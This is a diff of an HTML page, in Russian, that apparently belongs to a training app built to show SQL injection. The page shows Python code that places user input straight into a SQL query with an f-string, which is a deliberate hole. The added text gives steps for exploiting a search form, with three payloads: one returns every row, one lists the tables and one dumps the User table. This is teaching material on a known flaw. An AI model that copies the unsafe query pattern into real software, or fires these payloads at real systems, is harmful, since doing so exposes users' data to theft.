@@ -41,7 +41,10 @@
                                 sql = text(f"SELECT * FROM iss WHERE kr_name = '{str(user_input)}';")   <span class="comment">// формируем запрос в базу данных iss подставляя введенное пользователем значение</span>
                                 q = db.session.execute(sql) <span class="comment"></span> <span class="comment">// делаем запрос в БД</span>
                                 results = [dict(row._mapping) for row in q.fetchall()]
-                                return jsonify(results) <span class="comment">// возвращаем результат в веб-интерфейс</span>                      
+                                return jsonify(results) <span class="comment">// возвращаем результат в веб-интерфейс</span>
+                        <span class="comment">-------------------------------------------</span>    
+                        <span class="comment">Фрагмент этого кода реализован в примере ниже</span>
+                        <span class="comment">-------------------------------------------</span>                
                     </code>
                 </pre>  
             </div>
@@ -59,18 +62,19 @@
             <div class="col-12">
                 <pre>
                     <code style="background-color: #eee;">
-                        <span class="keyword">Для эксплуатации уязвимости необходимо сделать запрос в таблицу через форму поиска ""</span>
-
-
-                    </code>
-                </pre>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-12">
-                <pre>
-                    <code>
-                        <span class="keyword">Для </span>
+                        <span class="keyword">Для эксплуатации уязвимости необходимо сделать запрос через форму поиска "Поиск ИС (информационных систем)". 
+                        Для проверки того, имеется ли в этой форме уязвимость типа SQL-injection надо сделать следующие запросы 
+                        и через инструменты разработчика (f12) посмотреть какой ответ нам вернулся</span>
+                        <span class="comment">-------------------------------------------</span> 
+                        <span class="comment">// команда ниже выведет все значения из таблицы</span>
+                        <span class="string"><b>' or 1=1 --</b></span>
+                        <span class="comment">-------------------------------------------</span> 
+                        <span class="comment">// команда ниже выведет перечень все таблиц</span>
+                        <span class="string"><b>' ; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --</b></span>
+                        <span class="comment">-------------------------------------------</span> 
+                        <span class="comment">// команда ниже выведет все значения таблицы <b>User</b></span>
+                        <span class="string"><b>' ; SELECT * FROM User; --</b></span>
+                        <span class="comment">-------------------------------------------</span> 
                     </code>
                 </pre>
             </div>
